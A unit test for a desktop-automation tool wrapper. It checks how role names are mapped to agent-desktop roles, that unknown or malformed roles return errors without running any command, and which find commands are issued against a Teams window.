  it("maps find roles to agent-desktop's, and answers an unknown role itself without running anything", async () => {
    expect(findRole("TextBox")).toEqual({ role: "textfield" });
    expect(findRole("text field")).toEqual({ role: "textfield" });
    expect(findRole("hyperlink")).toEqual({ role: "link" });
    expect(findRole("Button")).toEqual({ role: "button" });
    expect(findRole("listitem", new Set(["button", "row"]))).toEqual({ role: "row" });
    expect(findRole("listitem")).toEqual({ error: expect.stringMatching(/no listitem role.*treeitem, row, cell/) });
    expect(findRole("widgetthing", new Set(["switch"]))).toEqual({ error: expect.stringMatching(/no widgetthing role\. Roles seen here: switch\. Roles: alert, .*treeitem/) });
    expect(findRole("a+b")).toEqual({ error: "Error: role is one word, for example button." });
    const { run, calls } = recorded(({ command }) => (command === "snapshot" ? { ok: true, data: window("s7", controls("s7")) } : { ok: true, data: { matches: [], roles_present: ["button", "combobox", "listbox"] } }));
    const { call } = setup({ run, askFirst: false, platform: "windows" });
    expect(await call("find", { app: "ms-teams.exe", role: "listitem" })).toMatch(/^Error: agent-desktop has no listitem role/);
    expect(await call("find", { app: "ms-teams.exe", role: "blah" })).toMatch(/^Error: agent-desktop has no blah role/);
    expect(calls).toEqual([]);
    await call("snapshot", { app: "ms-teams.exe" });
    expect(await call("find", { app: "ms-teams.exe", role: "listitem", name: "Zuzanna" })).toBe("Role treeitem for listitem. No matches. Roles here: button, combobox, listbox.");
    expect(await call("find", { app: "ms-teams.exe", role: "textbox" })).toMatch(/^Role textfield for textbox\./);
    expect(lines(calls).slice(1)).toEqual(["find --app=ms-teams.exe --role=treeitem --name=Zuzanna --limit=15", "find --app=ms-teams.exe --role=textfield --limit=15"]);
  });
});
